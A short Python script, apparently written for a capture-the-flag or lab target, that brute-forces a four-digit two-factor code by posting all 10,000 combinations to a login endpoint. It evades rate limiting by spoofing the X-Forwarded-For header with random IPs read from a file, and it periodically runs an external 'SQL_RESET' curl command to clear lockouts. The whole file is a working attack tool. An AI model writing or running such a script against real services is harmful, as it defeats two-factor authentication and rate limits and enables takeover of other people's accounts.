import requests
import spam
import subprocess
import random
import time
import itertools

combinations = list(itertools.product(range(10), repeat=4))

def try_2fa_code():
    response = requests.post(spam.URL, headers=spam.headers, data=spam.data, allow_redirects=True)
    return response
    

def execute_curl_command(curl_command):
    try:
        result = subprocess.run(curl_command, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return e.stderr

def get_random_ip():
    with open("ip.txt", 'r') as file:
        ip_addresses = [line.strip() for line in file if line.strip()]  # Read non-empty lines

    if ip_addresses:
        return random.choice(ip_addresses)
    else:
        print("Error: No valid IP addresses found in the file.")
        return None


if __name__ == "__main__":
    execute_curl_command(spam.SQL_RESET)
    start = time.time()
    i = 0
    while i < 10000:
        if time.time() - start > 290:
            start = time.time()
            print("ip reset")
            execute_curl_command(spam.SQL_RESET)
            i = 0
        
        code = ''.join(map(str, combinations[i]))
        spam.data["2fa-code"] = code
        print(spam.data["2fa-code"])

        res = try_2fa_code()
        print(res.text)
        
        i += 1

        if res.status_code == 429:
            spam.headers["X-Forwarded-For"] = get_random_ip()
            continue

        if res.status_code == 302 or res.status_code == 200:
            print(res.text)
            break;




